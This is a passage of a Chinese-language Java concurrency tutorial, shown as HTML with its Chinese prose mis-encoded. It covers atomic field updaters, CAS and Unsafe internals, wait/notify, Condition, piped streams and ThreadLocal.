<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// å°è¯•è®¾ç½®æ ‡è®°</span>
ref.attemptMark(<span class="hljs-string">"C"</span>, <span class="hljs-literal">true</span>);
</code></pre>
<h3 data-id="heading-207">9.5 å­—æ®µæ›´æ–°å™¨</h3>
<h4 data-id="heading-208">AtomicIntegerFieldUpdater</h4>
<p><strong>AtomicIntegerFieldUpdaterç”¨äºåŸå­åœ°æ›´æ–°å¯¹è±¡çš„æ•´å‹å­—æ®µã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ›å»ºæ›´æ–°å™¨</span>
AtomicIntegerFieldUpdater&lt;Counter&gt; updater = 
    AtomicIntegerFieldUpdater.newUpdater(Counter.class, <span class="hljs-string">"count"</span>);

<span class="hljs-comment">// ä½¿ç”¨æ›´æ–°å™¨</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
updater.get(counter);                  <span class="hljs-comment">// è·å–å€¼</span>
updater.set(counter, <span class="hljs-number">10</span>);              <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.incrementAndGet(counter);      <span class="hljs-comment">// è‡ªå¢</span>
updater.addAndGet(counter, <span class="hljs-number">5</span>);         <span class="hljs-comment">// åŠ 5</span>
</code></pre>
<p><strong>ä½¿ç”¨é™åˆ¶ï¼š</strong></p>
<ul>
<li>å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</li>
<li>å­—æ®µå¿…é¡»æ˜¯å¯è®¿é—®çš„ï¼ˆpublicæˆ–protectedï¼‰</li>
<li>ä¸èƒ½æ˜¯staticå­—æ®µ</li>
<li>ä¸èƒ½æ˜¯finalå­—æ®µ</li>
</ul>
<h4 data-id="heading-209">AtomicLongFieldUpdater</h4>
<p><strong>AtomicLongFieldUpdaterç”¨äºé•¿æ•´å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> <span class="hljs-variable">balance</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

AtomicLongFieldUpdater&lt;Account&gt; updater = 
    AtomicLongFieldUpdater.newUpdater(Account.class, <span class="hljs-string">"balance"</span>);
updater.addAndGet(account, <span class="hljs-number">100</span>);       <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerFieldUpdater</span>
</code></pre>
<h4 data-id="heading-210">AtomicReferenceFieldUpdater</h4>
<p><strong>AtomicReferenceFieldUpdaterç”¨äºå¼•ç”¨ç±»å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Node next;        <span class="hljs-comment">// å¿…é¡»æ˜¯volatile</span>
}

AtomicReferenceFieldUpdater&lt;Node, Node&gt; updater = 
    AtomicReferenceFieldUpdater.newUpdater(Node.class, Node.class, <span class="hljs-string">"next"</span>);

<span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
updater.get(node);                     <span class="hljs-comment">// è·å–å€¼</span>
updater.set(node, newNode);            <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.compareAndSet(node, old, <span class="hljs-keyword">new</span>); <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-211">9.6 åŸå­ç±»çš„å®ç°åŸç†</h3>
<h4 data-id="heading-212">CASæ“ä½œ</h4>
<p><strong>åŸå­ç±»çš„æ ¸å¿ƒæ˜¯CASæ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AtomicIntegerçš„incrementAndGetå®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> unsafe.getAndAddInt(<span class="hljs-built_in">this</span>, valueOffset, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
}

<span class="hljs-comment">// Unsafeçš„getAndAddIntå®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAndAddInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> delta)</span> {
    <span class="hljs-type">int</span> v;
    <span class="hljs-keyword">do</span> {
        v = getIntVolatile(o, offset); <span class="hljs-comment">// è·å–å½“å‰å€¼</span>
        <span class="hljs-comment">// CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSwapInt(o, offset, v, v + delta));
    <span class="hljs-keyword">return</span> v;
}
</code></pre>
<h4 data-id="heading-213">Unsafeç±»çš„ä½¿ç”¨</h4>
<p><strong>åŸå­ç±»é€šè¿‡Unsafeç±»ç›´æ¥æ“ä½œå†…å­˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicInteger</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Unsafe.getUnsafe();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> valueOffset; <span class="hljs-comment">// valueå­—æ®µçš„åç§»é‡</span>
    
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–valueå­—æ®µåœ¨å¯¹è±¡ä¸­çš„åç§»é‡</span>
            valueOffset = unsafe.objectFieldOffset
                (AtomicInteger.class.getDeclaredField(<span class="hljs-string">"value"</span>));
        } <span class="hljs-keyword">catch</span> (Exception ex) { <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(ex); }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> value; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
        <span class="hljs-comment">// ä½¿ç”¨CASæ“ä½œåŸå­åœ°æ›´æ–°valueå­—æ®µ</span>
        <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, valueOffset, expect, update);
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨<code>objectFieldOffset</code>è·å–å­—æ®µåç§»é‡</li>
<li>ä½¿ç”¨<code>compareAndSwapInt</code>è¿›è¡ŒCASæ“ä½œ</li>
<li>valueå­—æ®µä½¿ç”¨volatileä¿è¯å¯è§æ€§</li>
</ul>
<h4 data-id="heading-214">è‡ªæ—‹æœºåˆ¶</h4>
<p><strong>CASå¤±è´¥åä¼šè‡ªæ—‹é‡è¯•ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªæ—‹å®ç°ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> current;
    <span class="hljs-type">int</span> next;
    <span class="hljs-keyword">do</span> {
        current = get();        <span class="hljs-comment">// 1. è·å–å½“å‰å€¼</span>
        next = current + <span class="hljs-number">1</span>;     <span class="hljs-comment">// 2. è®¡ç®—æ–°å€¼</span>
        <span class="hljs-comment">// 3. CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSet(current, next));
    <span class="hljs-keyword">return</span> next;
}
</code></pre>
<p><strong>è‡ªæ—‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½å¥½</li>
</ul>
<p><strong>è‡ªæ—‹çš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPU</li>
<li>å¯èƒ½å¯¼è‡´CPUä½¿ç”¨ç‡100%</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥ï¼š</strong></p>
<ul>
<li>JDK 8+æä¾›äº†LongAdderç­‰ç´¯åŠ å™¨ï¼Œä½¿ç”¨åˆ†æ®µé”å‡å°‘ç«äº‰</li>
<li>é«˜ç«äº‰æ—¶å¯ä»¥ä½¿ç”¨synchronized</li>
</ul>
<hr/>
<h2 data-id="heading-215">ç¬¬åç«  çº¿ç¨‹é—´é€šä¿¡</h2>
<h3 data-id="heading-216">10.1 wait/notify/notifyAll</h3>
<h4 data-id="heading-217">Object.wait()æ–¹æ³•</h4>
<p><strong>wait()æ–¹æ³•ä½¿å½“å‰çº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°è¢«å…¶ä»–çº¿ç¨‹å”¤é†’ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// ç­‰å¾…</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€</span>
}

<span class="hljs-comment">// å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>wait()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>è°ƒç”¨wait()ä¼šé‡Šæ”¾é”</li>
<li>çº¿ç¨‹è¿›å…¥WAITINGçŠ¶æ€</li>
<li>è¢«å”¤é†’åéœ€è¦é‡æ–°è·å–é”æ‰èƒ½ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p><strong>wait()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">lock.wait();                      <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
lock.wait(<span class="hljs-number">1000</span>);                  <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
lock.wait(<span class="hljs-number">1000</span>, <span class="hljs-number">500000</span>);         <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’+çº³ç§’ï¼‰</span>
</code></pre>
<h4 data-id="heading-218">Object.notify()æ–¹æ³•</h4>
<p><strong>notify()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„å•ä¸ªçº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œé˜²æ­¢è™šå‡å”¤é†’</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}

<span class="hljs-comment">// è®¾ç½®æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    condition = <span class="hljs-literal">true</span>;
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>åªèƒ½å”¤é†’åœ¨æ­¤å¯¹è±¡ä¸Šwait()çš„çº¿ç¨‹</li>
<li>å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ï¼Œéšæœºå”¤é†’ä¸€ä¸ª</li>
<li>è¢«å”¤é†’çš„çº¿ç¨‹éœ€è¦é‡æ–°è·å–é”</li>
</ul>
<h4 data-id="heading-219">Object.notifyAll()æ–¹æ³•</h4>
<p><strong>notifyAll()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„æ‰€æœ‰çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notifyAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify() vs notifyAll()ï¼š</strong></p>

























<table><thead><tr><th>ç‰¹æ€§</th><th>notify()</th><th>notifyAll()</th></tr></thead><tbody><tr><td><strong>å”¤é†’æ•°é‡</strong></td><td>1ä¸ªçº¿ç¨‹</td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹å¤„ç†ç›¸åŒçš„ä»»åŠ¡</td><td>ç­‰å¾…çº¿ç¨‹å¤„ç†ä¸åŒçš„ä»»åŠ¡</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>æ›´å¥½ï¼ˆåªå”¤é†’ä¸€ä¸ªï¼‰</td><td>è¾ƒå·®ï¼ˆå”¤é†’æ‰€æœ‰ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-220">ä½¿ç”¨æ³¨æ„äº‹é¡¹</h4>
<p><strong>1. å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šæŠ›å‡ºIllegalMonitorStateException</span>
lock.wait();

<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();
}
</code></pre>
<p><strong>2. ä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶ï¼ˆé˜²æ­¢è™šå‡å”¤é†’ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½äº§ç”Ÿè™šå‡å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">if</span> (!condition) {
        lock.wait();
    }
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨whileå¾ªç¯</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
</code></pre>
<p><strong>3. æ³¨æ„é”çš„æŒæœ‰æ—¶é—´</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæŒæœ‰é”æ—¶é—´è¿‡é•¿</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    heavyOperation();  <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
    lock.wait();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåœ¨é”å¤–æ‰§è¡Œè€—æ—¶æ“ä½œ</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
heavyOperation();  <span class="hljs-comment">// åœ¨é”å¤–æ‰§è¡Œ</span>
</code></pre>
<h4 data-id="heading-221">è™šå‡å”¤é†’é—®é¢˜</h4>
<p><strong>è™šå‡å”¤é†’ï¼š</strong> çº¿ç¨‹å¯èƒ½åœ¨æ²¡æœ‰è°ƒç”¨notify()çš„æƒ…å†µä¸‹è¢«å”¤é†’ã€‚</p>
<p><strong>åŸå› ï¼š</strong> æ“ä½œç³»ç»Ÿå±‚é¢çš„ä¿¡å·ã€å…¶ä»–ç³»ç»Ÿè°ƒç”¨ã€JVMå®ç°ç»†èŠ‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨whileå¾ªç¯è€Œä¸æ˜¯if</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œè¢«å”¤é†’åå†æ¬¡æ£€æŸ¥</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}
</code></pre>
<h3 data-id="heading-222">10.2 Conditionæœºåˆ¶</h3>
<h4 data-id="heading-223">Condition.await()</h4>
<p><strong>Conditionæä¾›äº†æ›´çµæ´»çš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>await()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">condition.await();                                    <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
condition.awaitNanos(<span class="hljs-number">1000000</span>);                       <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šçº³ç§’</span>
condition.await(<span class="hljs-number">1</span>, TimeUnit.SECONDS);               <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´</span>
condition.awaitUntil(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());                    <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¥æœŸ</span>
condition.awaitUninterruptibly();                    <span class="hljs-comment">// ä¸å“åº”ä¸­æ–­</span>
</code></pre>
<h4 data-id="heading-224">Condition.signal()</h4>
<p><strong>signal()å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-225">Condition.signalAll()</h4>
<p><strong>signalAll()å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-226">å¤šä¸ªConditionçš„ä½¿ç”¨</h4>
<p><strong>Conditionçš„ä¼˜åŠ¿ï¼šå¯ä»¥ä¸ºä¸åŒçš„æ¡ä»¶åˆ›å»ºä¸åŒçš„Conditionã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// ä¸ç©ºæ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// ä¸æ»¡æ¡ä»¶</span>

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…ä¸æ»¡æ¡ä»¶ï¼Œé€šçŸ¥ä¸ç©ºæ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == items.length)
        notFull.await();
    <span class="hljs-comment">// ç”Ÿäº§...</span>
    notEmpty.signal();  <span class="hljs-comment">// é€šçŸ¥æ¶ˆè´¹è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// æ¶ˆè´¹è€…ï¼šç­‰å¾…ä¸ç©ºæ¡ä»¶ï¼Œé€šçŸ¥ä¸æ»¡æ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == <span class="hljs-number">0</span>)
        notEmpty.await();
    <span class="hljs-comment">// æ¶ˆè´¹...</span>
    notFull.signal();  <span class="hljs-comment">// é€šçŸ¥ç”Ÿäº§è€…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>æ›´ç²¾ç¡®çš„çº¿ç¨‹å”¤é†’æ§åˆ¶</li>
<li>é¿å…ä¸å¿…è¦çš„å”¤é†’</li>
<li>æé«˜æ€§èƒ½</li>
</ul>
<h3 data-id="heading-227">10.3 ç®¡é“é€šä¿¡</h3>
<h4 data-id="heading-228">PipedInputStream/PipedOutputStream</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—èŠ‚æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedInputStream</span> <span class="hljs-variable">pis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedInputStream</span>();
<span class="hljs-type">PipedOutputStream</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedOutputStream</span>();
pis.connect(pos);  <span class="hljs-comment">// è¿æ¥è¾“å…¥è¾“å‡ºæµ</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pos.write(<span class="hljs-string">"æ•°æ®"</span>.getBytes());
    pos.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pis.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pis.close();
}).start();
</code></pre>
<h4 data-id="heading-229">PipedReader/PipedWriter</h4>
<p><strong>ç®¡é“ç”¨äºçº¿ç¨‹é—´çš„å­—ç¬¦æµé€šä¿¡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">PipedReader</span> <span class="hljs-variable">pr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedReader</span>();
<span class="hljs-type">PipedWriter</span> <span class="hljs-variable">pw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PipedWriter</span>();
pr.connect(pw);  <span class="hljs-comment">// è¿æ¥è¯»å†™å™¨</span>

<span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    pw.write(<span class="hljs-string">"æ¶ˆæ¯"</span>);
    pw.close();
}).start();

<span class="hljs-comment">// æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span> data;
    <span class="hljs-keyword">while</span> ((data = pr.read()) != -<span class="hljs-number">1</span>) {
        System.out.print((<span class="hljs-type">char</span>) data);
    }
    pr.close();
}).start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ç®¡é“æ˜¯é˜»å¡çš„ï¼Œå¦‚æœç¼“å†²åŒºæ»¡ï¼Œå†™æ“ä½œä¼šé˜»å¡</li>
<li>å¦‚æœç¼“å†²åŒºç©ºï¼Œè¯»æ“ä½œä¼šé˜»å¡</li>
<li>é€‚åˆä¸€å¯¹ä¸€çš„çº¿ç¨‹é€šä¿¡</li>
</ul>
<h3 data-id="heading-230">10.4 çº¿ç¨‹é—´æ•°æ®å…±äº«</h3>
<h4 data-id="heading-231">ThreadLocal</h4>
<p><strong>ThreadLocalä¸ºæ¯ä¸ªçº¿ç¨‹æä¾›ç‹¬ç«‹çš„å˜é‡å‰¯æœ¬ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">ThreadLocal&lt;Integer&gt; threadLocal = ThreadLocal.withInitial(() -&gt; <span class="hljs-number">0</span>);

<span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å‰¯æœ¬</span>
<span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> threadLocal.get();
threadLocal.set(value + <span class="hljs-number">1</span>);
threadLocal.remove();  <span class="hljs-comment">// ä½¿ç”¨å®Œåè®°å¾—ç§»é™¤ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
</code></pre>
<p><strong>ThreadLocalçš„åº”ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>ç”¨æˆ·ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆç”¨æˆ·IDã€æƒé™ç­‰ï¼‰</li>
<li>æ•°æ®åº“è¿æ¥</li>
<li>æ—¥æœŸæ ¼å¼åŒ–å™¨</li>
<li>é¿å…å‚æ•°ä¼ é€’</li>
</ul>
<h4 data-id="heading-232">InheritableThreadLocal</h4>
<p><strong>InheritableThreadLocalå…è®¸å­çº¿ç¨‹ç»§æ‰¿çˆ¶çº¿ç¨‹çš„ThreadLocalå€¼ã€‚</strong></p>
